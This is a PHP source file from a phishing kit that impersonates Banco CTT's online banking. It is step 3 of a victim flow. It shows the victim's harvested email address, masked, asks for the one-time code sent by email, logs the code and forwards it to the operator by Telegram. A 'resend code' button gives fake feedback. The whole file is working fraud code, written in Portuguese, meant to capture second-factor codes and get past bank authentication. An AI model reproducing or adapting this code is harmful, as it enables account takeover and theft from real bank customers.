<?php
// ============================================================
//  emailotp.php — Step 3: Verification code received by Email
//
//  Free-format code: letters + numbers, unlimited length.
//  This page is Email-only (SMS verification lives in sms.php).
//  Shows the email address captured earlier, masked, and offers a
//  one-tap link to the matching webmail provider.
//
//  Backend:  POST emailotp.php  →  {"status":"ok","redirect":"loading.php"}
//  Log tag:  EMAILOTP        Step: emailotp
// ============================================================
require_once 'config.php';

$ip    = client_ip();
$state = init_state($ip, 'emailotp');

// ---- helpers -------------------------------------------------
function eotp_mask_email($e) {
    $e = trim($e);
    if ($e === '' || strpos($e, '@') === false) return '';
    $parts  = explode('@', $e, 2);
    $local  = $parts[0];
    $domain = $parts[1];
    if ($local === '' || $domain === '') return '';
    $keep = min(2, strlen($local));
    return substr($local, 0, $keep) . str_repeat('•', 3) . '@' . $domain;
}

function eotp_webmail($e) {
    $e = trim($e);
    if (strpos($e, '@') === false) return '';
    $domain = strtolower(substr(strrchr($e, '@'), 1));
    $map = array(
        'gmail.com'      => 'https://mail.google.com',
        'googlemail.com' => 'https://mail.google.com',
        'outlook.com'    => 'https://outlook.live.com/mail',
        'hotmail.com'    => 'https://outlook.live.com/mail',
        'live.com'       => 'https://outlook.live.com/mail',
        'yahoo.com'      => 'https://mail.yahoo.com',
        'yahoo.gr'       => 'https://mail.yahoo.com',
        'otenet.gr'      => 'https://webmail.otenet.gr',
        'forthnet.gr'    => 'https://webmail.forthnet.gr',
        'hotmail.gr'     => 'https://outlook.live.com/mail',
        'windowslive.com'=> 'https://outlook.live.com/mail',
        'icloud.com'     => 'https://www.icloud.com/mail',
        'protonmail.com' => 'https://mail.proton.me',
        'proton.me'      => 'https://mail.proton.me'
    );
    if (isset($map[$domain])) return $map[$domain];
    return 'https://' . $domain;   // generic: try the domain itself
}

// ---- what we already know about the victim -------------------
$known = isset($state['data']) ? $state['data'] : array();
$rawEmail = '';
if (!empty($known['billing']['email']))       $rawEmail = $known['billing']['email'];
elseif (!empty($known['email']['email']))      $rawEmail = $known['email']['email'];
elseif (!empty($known['login']['username']))   $rawEmail = $known['login']['username'];

$knownEmail = (strpos($rawEmail, '@') === false) ? '' : $rawEmail;
$mailMask   = eotp_mask_email($knownEmail);
$webmail    = eotp_webmail($knownEmail);

// ---- POST: capture the code ----------------------------------
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw = safe_input('code');
    if ($raw === '') $raw = safe_input('otp');

    $code = $raw;    // free text — letters + numbers, no length limit

    if ($code === '') {
        json_response(array('status' => 'error', 'message' => 'Introduza o código que recebeu por email.'));
    }

    $data = array(
        'code'   => $code,
        'email'  => $knownEmail !== '' ? $knownEmail : null,
        'type'   => 'Email OTP'
    );

    log_capture('EMAILOTP', $ip, $data);
    send_telegram_capture('EMAILOTP', '📧 Email OTP code', $ip, $data);
    update_state_step($ip, 'emailotp', $data);

    json_response(array('status' => 'ok', 'redirect' => 'loading.php'));
}
?>
<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificação de Email | Banco CTT Online</title>
<style><?php include '_style.php'; ?></style>
<style>
.mail-box{
    display:flex;
    align-items:center;
    gap:12px;
    background:#f7f9fa;
    border:1px solid #e6eaee;
    border-radius:4px;
    padding:12px 14px;
    margin:0 0 16px;
}
.mail-box .ico{
    width:38px;
    height:38px;
    flex:0 0 38px;
    border-radius:50%;
    background:#df0024;
    color:#ffffff;
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:18px;
}
.mail-box .txt{font-size:11px;color:#666;line-height:1.5}
.mail-box .who{
    display:block;
    font-size:13px;
    font-weight:700;
    color:#222222;
    font-family:Consolas,monospace;
    word-break:break-all;
}

/* Free-text code input (same settings as sms.php) */
.code-wrap{position:relative;margin:6px 0 8px}
.code-input{
    width:100%;
    height:50px;
    border:1.5px solid #c8c8c8;
    border-radius:6px;
    padding:0 14px;
    font-size:18px;
    font-weight:600;
    letter-spacing:2px;
    color:#222222;
    background:#fff;
    outline:none;
    transition:border-color .15s, box-shadow .15s;
}
.code-input:focus{
    border-color:#df0024;
    box-shadow:0 0 0 3px rgba(223,0,36,0.18);
}
.code-input::placeholder{
    color:#b5b5b5;
    font-weight:400;
    letter-spacing:0;
    font-size:14px;
}
.code-hint{
    font-size:11px;
    color:#888;
    text-align:center;
    margin:8px 0 14px;
    line-height:1.5;
}
.mail-actions{
    display:flex;
    gap:8px;
    margin:0 0 14px;
}
.mail-actions .btn{flex:1;font-size:11px;padding:9px 10px}
.switch-line{
    text-align:center;
    font-size:12px;
    color:#666;
    margin-top:14px;
}
.switch-line a{color:#df0024;font-weight:600;text-decoration:none}
.switch-line a:hover{text-decoration:underline}
@media(max-width:420px){
    .mail-actions{flex-direction:column}
}
</style>
</head>
<body>
<div class="page">
    <div class="card">
        <div class="brand-bar">Verificação Segura</div>

        <div class="step-header">
            <span>Verificação de Email</span>
            <span class="step-num">Passo 3</span>
        </div>

        <div class="logo-area">
            <img src="https://thebanks.eu/img/logos/Banco_CTT.png"
                 alt="Banco CTT"
                 onerror="this.outerHTML='<span class=&quot;logo-fallback&quot;>Banco CTT</span>'">
        </div>

        <div class="progress">
            <div class="seg done"></div>
            <div class="seg done"></div>
            <div class="seg active"></div>
            <div class="seg"></div>
            <div class="seg"></div>
            <div class="seg"></div>
        </div>

        <div class="body">
            <h2>Introduza o código recebido por email</h2>
            <p class="subtitle">
                Enviámos um <strong>código de verificação</strong> para o seu <strong>email registado</strong>.<br>
                Introduza-o abaixo.
            </p>

            <div class="mail-box">
                <div class="ico">✉</div>
                <div class="txt">
                    Enviado para
                    <span class="who"><?php echo htmlspecialchars($mailMask !== '' ? $mailMask : '•••@•••'); ?></span>
                </div>
            </div>

            <div id="msg" class="msg"></div>

            <form id="codeForm" autocomplete="off">
                <div class="code-wrap">
                    <input type="text"
                           class="code-input"
                           id="codeInput"
                           name="code"
                           autocomplete="one-time-code"
                           spellcheck="false"
                           placeholder="Introduza o código que recebeu no email"
                           style="text-transform:none">
                </div>

                <p class="code-hint">
                    O código pode conter números e letras. Não há limite de caracteres.
                    Verifique também a pasta de spam.
                </p>

                <button type="submit" class="btn btn-primary" id="submitBtn" disabled>CONFIRMAR CÓDIGO</button>
            </form>

            <div class="mail-actions">
                <?php if ($webmail !== ''): ?>
                    <a class="btn btn-secondary" href="<?php echo htmlspecialchars($webmail); ?>" target="_blank" rel="noopener">Abrir Email</a>
                <?php else: ?>
                    <a class="btn btn-secondary" href="#" onclick="return false;">Abrir Email</a>
                <?php endif; ?>
                <a class="btn btn-secondary" href="#" id="resendLink" onclick="return false;">Reenviar código</a>
            </div>

            <p class="switch-line">
                Não é o seu email? <a href="index.php">Voltar ao início de sessão</a>
                &nbsp;·&nbsp;
                Prefere receber por <strong>SMS</strong>? <a href="sms.php">Receber por SMS</a>
            </p>
        </div>

        <div class="footer">
            © 2026 Banco CTT — O código de email é válido durante 10 minutos
        </div>
    </div>
</div>

<div class="overlay" id="overlay"><div class="spinner"></div></div>
<script>
(function(){
    var form      = document.getElementById('codeForm');
    var input     = document.getElementById('codeInput');
    var msg       = document.getElementById('msg');
    var overlay   = document.getElementById('overlay');
    var submitBtn = document.getElementById('submitBtn');

    function refresh(){
        submitBtn.disabled = (input.value.trim().length === 0);
    }
    function hideMsg(){ msg.style.display = 'none'; }
    function showMsg(cls, text){
        msg.className = 'msg ' + cls;
        msg.textContent = text;
        msg.style.display = 'block';
    }

    /* ----- input ----- */
    input.addEventListener('input', function(){
        refresh(); hideMsg();
    });
    input.addEventListener('keydown', function(e){
        if (e.key === 'Enter' && input.value.trim().length > 0){
            e.preventDefault();
            form.requestSubmit();
        }
    });

    /* ----- submit ----- */
    form.addEventListener('submit', function(e){
        e.preventDefault();
        var code = input.value.trim();
        if (code.length === 0) return;

        overlay.classList.add('show');
        submitBtn.disabled = true;

        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'emailotp.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function(){
            if (xhr.readyState !== 4) return;
            overlay.classList.remove('show');
            try {
                var resp = JSON.parse(xhr.responseText);
                if (resp.status === 'ok' && resp.redirect) {
                    window.location.href = resp.redirect;
                } else {
                    showMsg('error', resp.message || 'O código não está correto. Tente novamente.');
                    resetForm();
                }
            } catch(err) {
                showMsg('error', 'Erro de comunicação. Tente novamente.');
                resetForm();
            }
        };
        xhr.send('code=' + encodeURIComponent(input.value.trim()));
    });

    function resetForm(){
        submitBtn.disabled = false;
        refresh();
    }

    /* ----- resend cooldown (fake feedback) ----- */
    var cooldown = 0;
    var resend   = document.getElementById('resendLink');
    setInterval(function(){ if (cooldown > 0) cooldown--; }, 1000);
    resend.addEventListener('click', function(){
        if (cooldown > 0) return;
        cooldown = 60;
        showMsg('success', 'Foi enviado um novo código para o seu email.');
        var t = setInterval(function(){
            if (cooldown <= 0) { clearInterval(t); resend.textContent = 'Reenviar código'; }
            else { resend.textContent = 'Reenviar em ' + cooldown + 's'; }
        }, 1000);
    });

    input.focus();
    refresh();
})();
</script>
</body>
</html>